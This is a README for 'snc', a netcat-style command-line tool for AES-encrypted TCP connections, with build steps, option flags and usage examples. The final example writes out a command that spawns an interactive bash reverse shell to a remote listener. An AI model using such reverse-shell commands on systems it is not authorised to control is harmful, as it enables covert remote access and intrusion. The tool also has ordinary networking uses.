snc
===
A very flexible CLI utility for general purpose, AES-encrypted TCP connections. Inspired by `netcat`, `cryptcat` and `ssh`, `snc` aims to provide everything in one place, from a raw communication channel to a fully interactive TTY reverse shell.

Compilation
-----------
```
user@host:~$ git clone https://github.com/hiatus/snc.git
user@host:~$ cd snc && make
```

Usage
-----
```
snc [options] [host]? [port]
	-h           This
	-v           Enable runtime messages
	-n           Disable DNS resolution
	-f           Fork prior to connecting
	-r           Set terminal to raw mode prior to starting IO
	-e [args]    Execute [args] and use it's IO
	-E [args]    Execute [args] in a PTY and use it's IO
	-d [char]    Use [char] as string delimiter for [args]
	-k [pass]    Use the string [pass] as AES key
	-K [file]    Use the file [file] as AES key
	-i [file]    Read input from [file] instead of stdin
	-o [file]    Write output to [file] instead of stdout
	-w [secs]    Set a timeout in [secs] for idle connections
	-a [num]     Allow [num] authentication attempts (use 0 for no limit)

	If [host] is not provided, listen on [port]
```

Examples
--------
* #### Transfer a file
	* Server
	```
	user@server:~$ snc -vk password -i message.txt 12345
	[snc] Listening on port 12345
	[snc] New connection from 192.168.0.13:41180
	[snc] Authenticated
	[snc] 96 bytes sent, 16 received
	user@server:~$
	```

	* Client
	```
	user@client:~$ snc -k password 192.168.0.12 12345
	Secret message
	user@client:~$
	```

* #### Create a raw communication channel
	* Server
	```
	user@server:~$ snc -vK key.bin 12345
	[snc] Listening on port 12345
	[snc] New connection from 192.168.0.13:41184
	[snc] Authenticated
	Hello, server.
	Hello, client.
	Farewell, client.
	[snc] 144 bytes sent, 48 received
	user@server:snc$
	```

	* Client
	```
	user@client:~$ snc -K key.bin 192.168.0.12 12345
	Hello, server.
	Hello, client.
	Farewell, client.
	user@client:~$
	```

* #### Transfer the output of a simple command
	* Server
	```
	user@server:~$ snc -vk password -e '/bin/echo Hello' 12345
	[snc] Listening on port 12345
	[snc] New connection from 192.168.0.13:37480
	[snc] Authenticated
	[snc] 96 bytes sent, 16 received
	user@server:~$
	```

	* Client
	```
	user@client:~$ snc -k password 192.168.0.12 12345
	Hello
	user@client:~$
	```

* #### Spawn a fully interactive TTY reverse shell
	* Client
	```
	user@client:~$ snc -vk password -E '/bin/bash -i' 192.168.0.12 12345
	[snc] Connecting to 192.168.0.12:12345
	[snc] Connected
	[snc] Authenticated
	[snc] 720 bytes sent, 448 received
	user@client:~$
	```

	* Server
	```
	user@server:~$ snc -rk password 12345
	user@client:~$ whoami
	user
	user@client:~$ exit
	exit
	user@server:~$
	```
